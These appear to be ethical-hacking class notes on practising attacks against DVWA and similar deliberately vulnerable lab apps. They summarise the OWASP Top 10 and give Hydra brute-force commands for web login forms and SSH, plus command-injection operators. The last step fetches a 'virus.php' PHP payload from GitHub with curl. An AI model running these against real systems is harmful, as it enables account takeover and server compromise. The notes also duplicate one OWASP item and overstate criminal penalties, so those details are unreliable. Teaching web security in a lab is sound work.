Who is a Linux admin?
A person who can make changes to a system is allowed to own it. We all are the admin of our system.
configuration
add remove programs
access any file
manage networking task
firewall 
etc

So if a person does the same thing on a system he is not allowed to, is he admin? No, he is a criminal, and a 10-year prison is a minimum punishment for such people.

Allowed: Ethical hacker, penetration tester, bug bounty specialist, network and security researcher.
Not allowed: Black hat hacker out of work premises or anyone who has not been hired or allowed to do such thing for a specific company. 

Ok now, 
We can't attack a specific target (we are not allowed to) but we can learn how to do that in some situations like helping a small-scale company protect their organization from cyber attacks. By educating them about the things they are not aware of.

We can create a target for us, to practice
Create machines like DVWA, XVWA, OWASP, OWASP web Goat, bWAPP, and more buggy web applications
Today we are going to host a local website for us on KALI we know as DVWA, which has lots of Vulnerabilities added to it. We will use it as a target and exploit some of the Vulnerabilities in multiple ways.
Why a website? Because it can be the entry point to a network. Website is one of the first things which is publically available for anyone to access. We can scan using Nmap, Zenmap, or Nikto and get to know more about the things and working for the webpage.

No, he may be an ethical hacker, black hat hacker, security researcher, penetration tester, and works for a company. Some of them are allowed some of them are not, still, they are trying to get into the network which is not legal. 10 years in jail is another option for him.

OWASP (Open Web Application Security Project) Top 10
If you intend to get into the world of ethical hacking and particularly web application penetration “pen” testing a good starting point is understanding what OWASP is and more particularly the OWASP Top 10.

For today's tutorial, you just require BurpSuite and firefox browser with hydra installed in Kali Linux.

“The Open Web Application Security Project® (OWASP) is a nonprofit foundation that works to improve the security of software. Through community-led open source software projects, hundreds of local chapters worldwide, tens of thousands of members, and leading educational and training conferences, the OWASP Foundation is the source for developers and technologists to secure the web.” 

Top 10 Web Application Security Risks
01- Injection. Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.

02- Broken Authentication. Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.

03- Sensitive Data Exposure. Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser.

04- XML External Entities (XXE). Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.

05- Broken Access Control. Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as accessing other users’ accounts, viewing sensitive files, modifying other users’ data, changing access rights, etc.

06- Security Misconfiguration. Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion.

07- Cross-Site Scripting XSS. XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface websites, or redirect the user to malicious sites.

08- Insecure Deserialisation. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.

09- Using Components with Known Vulnerabilities. Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.

10- Using Components with Known Vulnerabilities. Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.
________________________________________________________________
We are going to have a look at some of these vulnerabilities using the Damn Vulnerable Web Application (DVWA). It’s a freely available web application that has been intentionally loaded with loads of vulnerabilities.
________________________________________________________________
A list of vulnerabilities in DVWA is:
a) Brute Force
b) Command Injection
c) CSRF
d) File Inclusion
e) File Upload
f) Insecure CAPTCHA
g) SQL Injection
h) SQL Injection (Blind)
i) Weak Session IDs
j) XSS (DOM)
k) XSS (Reflected)
l) XSS (Stored)
m) CSP Bypass
n) JavaScript
________________________________________________________________
Bruit Foruse Attack:
The most common attacks are 
1) Bruit Force attack
A
AA
Aa
aa
2) Dictionary attack (type of bruit force) 2 files user.txt password.txt
admin password    
admin passwd01
admin passwords
admin pas123

Q1. What's a Brute Force Attack?
Q2. Types of Brute Force Attacks?

Ans 1
A brute force attack uses trial-and-error to guess login info, and encryption keys, or find a hidden web page. Hackers work through all possible combinations hoping to guess correctly.

Ans 2
a) Simple Brute Force Attacks
b) Dictionary Attacks
c) Hybrid Brute Force Attacks
d) Reverse Brute Force Attacks
e) Credential Stuffing

a) Simple brute force attacks: hackers attempt to logically guess your credentials — completely unassisted by software tools or other means. These can reveal extremely simple passwords and PINs. For example, a password that is set as “guest12345”.

b) Dictionary attacks: in a standard attack, a hacker chooses a target and runs possible passwords against that username. These are known as dictionary attacks. Dictionary attacks are the most basic tool in brute force attacks. While not necessarily brute force attacks in themselves, these are often used as an important component for password cracking. Some hackers run through unabridged dictionaries and augment words with special characters and numerals or use special dictionaries of words, but this type of sequential attack is cumbersome.

c) Hybrid brute force attacks: these hackers blend outside means with their logical guesses to attempt a break-in. A hybrid attack usually mixes dictionary and brute force attacks. These attacks are used to figure out combo passwords that mix common words with random characters. A brute force attack example of this nature would include passwords such as NewYork1993 or Spike1234.

d) Reverse brute force attacks: just as the name implies, a reverse brute force attack reverses the attack strategy by starting with a known password. Then hackers search millions of usernames until they find a match. Many of these criminals start with leaked passwords that are available online from existing data breaches.

e) Credential stuffing: if a hacker has a username-password combo that works for one website, they’ll try it on tons of others as well. Since users have been known to reuse login info across many websites, they are the exclusive targets of an attack like this.
________________________________________________________________
There are other purpose-built buggy applications that you can practice with.

1- bWAPP, or a buggy web application
2- OWASP Mutillidae II
3- OWASP WebGoat
________________________________________________________________
*******************START THE CLASS*********************
---------------------------------------------------------------

How to install DVWA (kali Ubuntu)?
https://pastebin.com/Ka44uQBi

How to install DVWA in Termux ?
https://pastebin.com/sL0L3ejw

In this lecture, we are going to talk about brute forcing login pages using hydra and burp suite. We will attack: 
DVWA and http://testasp.vulnweb.com

For this demonstration I'm going to use DVWA (The Damn Vulnerable Web Application is a software project that intentionally includes security vulnerabilities and is intended for educational purposes. ) It is your private lab for testing purposes. 

Some attacks we are going to cover in upcoming videos will are:
a) Brute Force
b) Command Injection
c) CSRF- 
Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious website, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site when the user is authenticated.

d) File Inclusion- Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server. LFI attacks can expose sensitive information, and in severe cases, they can lead to cross-site scripting (XSS) and remote code execution.

e) File Upload
f) Insecure CAPTCHA- 
CAPTCHA's risks can contribute to client-side attacks, Exploitable issues included cross-site scripting (XSS), cross-site request forgery, SQL injection, brute-force protection bypass, and arbitrary web script execution.

g) SQL Injection
h) SQL Injection (Blind)

i) Weak Session IDs- Weak session IDs can expose your users to having their session hijacked. If your session IDs are picked from a small range of values, an attacker only needs to probe randomly chosen session IDs until they find a match.

j) XSS (DOM) Document object mode.
What is DOM https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/DOM-model.svg/1200px-DOM-model.svg.png
Difference between DOM and Reflected XSS attack
https://pediaa.com/wp-content/uploads/2019/08/Difference-Between-DOM-Based-XSS-and-Reflected-XSS-Comparison-Summary.jpg


k) XSS (Reflected)
l) XSS (Stored)
m) CSP Bypass
Content Security Policy (CSP) is an added layer of security for the mitigation of cross-site scripting (XSS) attacks. However, an attacker can leverage misconfigurations in CSP to execute XSS through CSP bypass techniques

n) JavaScript
What is a JavaScript Injection Attack? In a JavaScript injection attack, an attacker injects malicious code into the client-side JavaScript directly. This code launches and renders when the victim loads the website with the malicious script in their client application/browser.

Demonstration time:
Burp Suite Bruiteforce using a dictionary attack
Dictionary attack with Hydra in Kali Linux

Hydra:
Hydra can perform rapid dictionary attacks against more than 50 protocols. This includes telnet, FTP, HTTP, HTTPS, SMB, databases, and several other services.

sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"

hydra -l admin -P/usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout"-vV-f

-l indicates a single username (use -L for a username list)
-P indicates the use the following password list
http-post-form indicates the type of form
/dvwa/login-php is the login page URL
username is the form field where the username is entered
^USER^ tells Hydra to use the username or list in the field
password is the form field where the password is entered (it may be passwd, pass, etc.)
^PASS^ tells Hydra to use the password list supplied
Login indicates to Hydra the login failed message
Login failed is the login failure message that the form returned
-V is for verbose output showing every attempt

# Hydra ssh attack 
hydra -L user.txt -P pass.txt 192.168.29.135 ssh -t 4

-l specifies a username during a brute force attack.
-L specifies a username wordlist to be used during a brute force attack.
-p specifies a password during a brute force attack.
-P specifies a password wordlist to use during a brute force attack.
-t set to 4, which sets the number of parallel tasks (threads) to run.



# scan the website using Uniscan
Nikto (nikto -h 192.168.1.1 -p 80)
uniscan-gui
acunetix pro
Burp scanner
vega (with java8)
J2EESCAN burp suite

_____________________________________________________________________________day2_______________________________________________________________________

#Login main login panel http://localhost:DVWA/login.php
sudo hydra 192.168.1.7 http-form-post "/DVWA/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -l admin -P password.txt

#Login 2nd Bruitefource login page
sudo hydra 192.168.1.7 http-form-post "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=submit:Username and/or password incorrect." -l admin -P password.txt -V -I
_____________________________________________________________________________day3_______________________________________________________________________
Command 
Command injection:- 
Command Execution or Command injection is an attack in which the goal is the execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell.

Operators:
; , &, &&, | ,|, >, <
;: Saperator to execute one command after 

&: Runs process in background useful in bash scripting to redirect output so that errors can be redirected to null

&&: Same as ;, helps you to run commands one after another 

|: Or operator, helps to pipe output from the first command to 2nd or can execute 2nd command as output, the first command will not be visible if that is not passed as a valid parameter to 2nd command.

>: Save input from a file to another file

<: take input from a file

Php payload link:
https://github.com/efxtv/EFX-Tv-Bookmarks/tree/main/bin/php

How to call PHP payload in web server
Security level needs to be 2, 
curl https://raw.githubusercontent.com/efxtv/EFX-Tv-Bookmarks/main/bin/php/virus.php

___________________________________________________________________________day 4____________________________________________________________________
